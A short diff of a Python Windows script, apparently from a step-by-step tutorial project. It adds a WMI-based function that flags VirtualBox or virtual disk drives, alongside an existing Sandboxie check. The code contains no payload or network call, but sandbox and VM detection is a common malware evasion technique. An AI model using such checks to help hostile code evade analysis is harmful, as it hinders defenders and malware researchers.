@@ -17,7 +17,7 @@ from time import sleep
 import ctypes
 import subprocess
 import threading
-import wmi
+from wmi import WMI
 
 import win32api
 import winerror
@@ -52,6 +52,16 @@ def detect_sandboxie():
 
     except: return ""
 
+
+# Step 5: Define a Function to Detect VM
+def detectVM():
+    objWMI = WMI()
+
+    for diskDrive in objWMI.query("Select * from Win32_DiskDrive"):
+        if 'vbox' in diskDrive.Caption.lower() or 'virtual' in diskDrive.Caption.lower():
+            return " (Virtual Machine) "
+
+    return ""
 
 
 
